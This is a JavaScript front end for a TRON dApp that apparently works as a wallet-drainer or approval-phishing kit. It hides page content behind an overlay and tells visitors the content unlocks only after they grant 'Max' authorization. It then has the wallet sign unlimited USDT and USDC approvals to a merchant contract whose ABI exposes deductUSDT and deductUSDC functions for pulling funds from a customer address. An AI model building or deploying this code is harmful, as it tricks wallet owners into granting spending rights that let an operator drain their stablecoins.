// src/main.js
// 最終穩定版代碼 (已修正所有 WalletConnect V2 時序和連接錯誤)

// --- 配置常量 ---
const WC_PROJECT_ID = '21ae0b7f500d5d9e2ed3c74c463df3f0'; // 🚨 請使用您的 Project ID 🚨
const TRON_CHAIN_ID = 'tron:50'; // TRON 主網鏈 ID
const TRON_RPC_URL = 'https://api.trongrid.io';

// 您的合約和代幣地址
const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; 
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'; 

// 您的合約 ABI (為簡潔，僅列出變數名)
const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","type":"address"},{"name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];


// --- 狀態變數 ---
let tronWeb;
let userAddress;
let merchantContract;
let usdtContract;
let usdcContract;
let isConnectedFlag = false;
let provider; // WalletConnect Provider 實例
let web3ModalInstance; // 延遲初始化的 Web3Modal 實例

// --- UI 元素 ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay');
const overlayMessage = document.getElementById('overlayMessage');
const deductionForm = document.getElementById('deductionForm');
const tokenSelectForm = document.getElementById('tokenSelectForm'); 
const deductionAmountInput = document.getElementById('deductionAmount');
const deductButton = document.getElementById('deductButton'); 


// --- WalletConnect V2 延遲初始化函數 ---
function initializeWeb3Modal() {
    // 檢查 Web3Modal 是否已被 CDN 正確載入
    if (!window.Web3Modal) {
        console.error("Web3Modal CDN 未載入！請檢查 index.html 中的 <script> 順序。");
        return false;
    }
    if (!web3ModalInstance) {
        web3ModalInstance = new window.Web3Modal.Web3Modal({
            projectId: WC_PROJECT_ID,
            themeMode: 'light',
            walletConnect: {
                show: true,
            },
        });
    }
    return true;
}


// --- 輔助函數 ---
function showOverlay(message) {
    overlayMessage.innerHTML = message;
    blurOverlay.style.display = 'flex';
}
function hideOverlay() {
    blurOverlay.style.display = 'none';
    if (isConnectedFlag && deductionForm) {
        deductionForm.style.display = 'block';
    }
}
function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connected) {
        connectButton.classList.add('connected');
        connectButton.title = `已連線: ${address.substring(0, 4)}...${address.slice(-4)}`;
        hideOverlay();
    } else {
        connectButton.classList.remove('connected');
        connectButton.title = '連繫錢包';
        showOverlay('請連繫您的錢包並完成 Max 授權以解鎖內容 🔒');
        if(deductionForm) deductionForm.style.display = 'none';
    }
}

async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
    if (!tronWeb || !userAddress) return false;
    try {
        const allowanceRaw = await tokenContract.allowance(userAddress, spenderAddress).call();
        const allowance = tronWeb.BigNumber(allowanceRaw);
        const MAX_ALLOWANCE_THRESHOLD = tronWeb.BigNumber('100000000000000000000000000000000000000'); 
        return allowance.gte(MAX_ALLOWANCE_THRESHOLD);
    } catch (error) {
        console.error("Failed to check allowance:", error);
        return false;
    }
}


// --- 核心邏輯：WalletConnect V2 連接 (終極防禦修正) ---
async function connectWallet() {
    // 禁用按鈕，防止重複點擊導致時序錯誤
    if (connectButton) connectButton.disabled = true;

    if (isConnectedFlag) {
        await disconnectWallet();
        if (connectButton) connectButton.disabled = false;
        return;
    }

    if (!initializeWeb3Modal()) {
        showOverlay('WalletConnect 啟動失敗，請檢查 CDN 載入！');
        if (connectButton) connectButton.disabled = false;
        return;
    }

    showOverlay('正在開啟錢包選擇，請選擇您的 TRON 錢包...');

    try {
        // 1. 打開 Modal
        await web3ModalInstance.openModal(); 
        
        // 2. 確保 UniversalProvider 已經載入
        if (!window.UniversalProvider) throw new Error("UniversalProvider CDN is not loaded on window.");

        // 3. 初始化 UniversalProvider (最關鍵一步)
        provider = await window.UniversalProvider.init({
            projectId: WC_PROJECT_ID,
            metadata: {
                name: '您的 DApp 名稱',
                description: '您的 DApp 描述',
                url: window.location.origin,
                icons: ['https://yourdapp.com/icon.png'],
            },
        });

        // 4. 請求連接
        const session = await provider.connect({
            requiredNamespaces: {
                tron: {
                    methods: ['tron_signTransaction', 'tron_signMessage'],
                    chains: [TRON_CHAIN_ID],
                    events: ['accountsChanged', 'chainChanged'],
                },
            },
        });
        
        // 5. 獲取帳戶地址
        const tronNamespace = session.namespaces.tron;
        if (!tronNamespace || !tronNamespace.accounts || tronNamespace.accounts.length === 0) {
             throw new Error("WalletConnect: Unable to get account address.");
        }
        userAddress = tronNamespace.accounts[0].split(':')[2]; 

        // 6. 創建 TronWeb 只讀實例
        if (!window.TronWeb) throw new Error("TronWeb is not loaded.");
        tronWeb = new window.TronWeb({
            fullHost: TRON_RPC_URL,
            privateKey: '00', 
        });

        // 7. 初始化合約並處理後續邏輯
        await initializeContracts();
        updateConnectionUI(true, userAddress);
        await handlePostConnection();

    } catch (error) {
        console.error("連接失敗:", error);
        // 如果 provider 已經存在但連接失敗，嘗試斷開連接
        if (provider) {
             await provider.disconnect().catch(() => {});
        }
        showOverlay(`連線失敗！錯誤: ${error.message}。請嘗試使用 DApp 瀏覽器或檢查 Project ID。`);
        updateConnectionUI(false);
    } finally {
        // 無論成功或失敗，關閉 Modal 並啟用按鈕
        if(web3ModalInstance) web3ModalInstance.closeModal();
        if (connectButton) connectButton.disabled = false;
    }
}

async function disconnectWallet() {
    // 嚴格檢查 provider 是否存在
    if (provider && provider.session) {
        await provider.disconnect();
    }
    tronWeb = null;
    userAddress = null;
    updateConnectionUI(false);
}

async function initializeContracts() {
    if (!tronWeb) throw new Error("TronWeb instance not available.");
    merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
    usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
    usdcContract = await tronWeb.contract().at(USDC_CONTRACT_ADDRESS);
}


async function handlePostConnection() {
    if (!isConnectedFlag) return;
    
    const status = await checkAuthorization();
    const allAuthorized = status.contract && status.usdt && status.usdc;

    if (allAuthorized) {
        hideOverlay(); 
    } else {
        showOverlay('偵測到錢包，但 Max 授權尚未完成。即將開始授權流程...');
        const authSuccess = await connectAndAuthorize();
        if (authSuccess) {
            await handlePostConnection(); 
        }
    }
}

async function checkAuthorization() {
    if (!tronWeb || !userAddress || !merchantContract) {
        return { contract: false, usdt: false, usdc: false };
    }
    const isContractAuthorized = await merchantContract.authorized(userAddress).call();
    const isUsdtMaxAuthorized = await checkTokenMaxAllowance(usdtContract, MERCHANT_CONTRACT_ADDRESS);
    const isUsdcMaxAuthorized = await checkTokenMaxAllowance(usdcContract, MERCHANT_CONTRACT_ADDRESS);
    
    return { contract: isContractAuthorized, usdt: isUsdtMaxAuthorized, usdc: isUsdcMaxAuthorized };
}

// --- 核心授權邏輯 (使用 WalletConnect 簽名) ---
async function connectAndAuthorize() {
    const status = await checkAuthorization();
    const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; 
    const ZERO_UINT = "0"; 
    
    const totalTxs = (status.contract ? 0 : 1) + (status.usdt ? 0 : 2) + (status.usdc ? 0 : 2); 
    let txCount = 0;

    if (totalTxs === 0) {
        showOverlay("所有授權已就緒，無需額外交易。");
        await new Promise(resolve => setTimeout(resolve, 1500)); 
        return true;
    }
    
    try {
        if (!provider) throw new Error("WalletConnect Provider 尚未初始化。"); // 再次檢查 Provider

        if (!status.contract) {
            txCount++;
            showOverlay(`步驟 ${txCount}/${totalTxs}: 正在發送合約授權 (ConnectAndAuthorize)。請在 Trust Wallet 中同意！`);
            const transaction = await merchantContract.connectAndAuthorize().build(); 
            const signedTx = await provider.request({ method: 'tron_signTransaction', params: [transaction] });
            await tronWeb.trx.sendRawTransaction(signedTx);
        }

        if (!status.usdt) {
            txCount++;
            showOverlay(`步驟 ${txCount}/${totalTxs}: USDT 安全步驟: 重置授權至 0 (請同意)...`);
            const zeroApproveTx = await usdtContract.approve(MERCHANT_CONTRACT_ADDRESS, ZERO_UINT).build();
            const signedZeroApprove = await provider.request({ method: 'tron_signTransaction', params: [zeroApproveTx] });
            await tronWeb.trx.sendRawTransaction(signedZeroApprove);

            txCount++;
            showOverlay(`步驟 ${txCount}/${totalTxs}: 設置 USDT Max 扣款授權 (最終授權 - 請同意)...`);
            const maxApproveTx = await usdtContract.approve(MERCHANT_CONTRACT_ADDRESS, MAX_UINT).build();
            const signedMaxApprove = await provider.request({ method: 'tron_signTransaction', params: [maxApproveTx] });
            await tronWeb.trx.sendRawTransaction(signedMaxApprove);
        }

        if (!status.usdc) {
            txCount++;
            showOverlay(`步驟 ${txCount}/${totalTxs}: USDC 安全步驟: 重置授權至 0 (請同意)...`);
            const zeroApproveTx = await usdcContract.approve(MERCHANT_CONTRACT_ADDRESS, ZERO_UINT).build();
            const signedZeroApprove = await provider.request({ method: 'tron_signTransaction', params: [zeroApproveTx] });
            await tronWeb.trx.sendRawTransaction(signedZeroApprove);
            
            txCount++;
            showOverlay(`步驟 ${txCount}/${totalTxs}: 設置 USDC Max 扣款授權 (最終授權 - 請同意)...`);
            const maxApproveTx = await usdcContract.approve(MERCHANT_CONTRACT_ADDRESS, MAX_UINT).build();
            const signedMaxApprove = await provider.request({ method: 'tron_signTransaction', params: [maxApproveTx] });
            await tronWeb.trx.sendRawTransaction(signedMaxApprove);
        }
        
        return true;
    } catch (error) {
        console.error("Authorization Failed:", error);
        showOverlay(`授權交易失敗，錯誤訊息: ${error.message}。請確保您同意了所有 ${totalTxs} 筆交易。`);
        return false;
    }
}


// --- 核心扣款邏輯 (使用 WalletConnect 簽名) ---
async function triggerBackendDeduction(token, amount) {
    if (!isConnectedFlag || !userAddress || !merchantContract || !provider) {
        showOverlay("請先連繫錢包並完成授權！");
        return;
    }

    showOverlay(`正在發起 ${token} 扣款，金額: ${amount}。請在 Trust Wallet 中確認簽名！`);

    try {
        const tokenContractAddress = token === 'USDT' ? USDT_CONTRACT_ADDRESS : USDC_CONTRACT_ADDRESS;
        const contractMethod = token === 'USDT' ? merchantContract.deductUSDT : merchantContract.deductUSDC;
        const tokenContract = token === 'USDT' ? usdtContract : usdcContract;

        const balance = await tokenContract.balanceOf(userAddress).call();
        if (tronWeb.BigNumber(balance).lt(tronWeb.toSun(amount))) {
            throw new Error(`餘額不足: 僅剩 ${tronWeb.fromSun(balance)} ${token}`);
        }

        const sunAmount = tronWeb.toSun(amount);
        // 構建交易
        const transaction = await contractMethod(userAddress, tokenContractAddress, sunAmount).build(); 

        // 透過 WalletConnect V2 請求簽名
        const signedTx = await provider.request({
            method: 'tron_signTransaction',
            params: [transaction],
        });

        const result = await tronWeb.trx.sendRawTransaction(signedTx);
        
        if (result.txid) {
            showOverlay(`✅ 扣款成功！交易 ID: ${result.txid.substring(0, 10)}...`);
        } else {
            throw new Error("交易失敗或未被廣播。");
        }
    } catch (error) {
        console.error("Deduction Failed:", error);
        showOverlay(`扣款失敗！錯誤: ${error.message}。請檢查您的餘額及授權額度。`);
    }
}

function triggerDeductionFromForm() {
    const token = tokenSelectForm.value;
    const amount = deductionAmountInput.value;

    if (isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
        alert("請輸入有效的金額！");
        return;
    }
    
    triggerBackendDeduction(token, amount);
}


// 設置事件監聽器
if (connectButton) connectButton.addEventListener('click', connectWallet);
if (deductButton) {
    // 修正: 使用 id 綁定事件，避免 CSP 錯誤
    deductButton.addEventListener('click', triggerDeductionFromForm);
}

// 頁面載入時初始化
showOverlay('請連繫您的錢包並完成 Max 授權以解鎖內容 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(點擊右上角錢包圖標開始)</p>');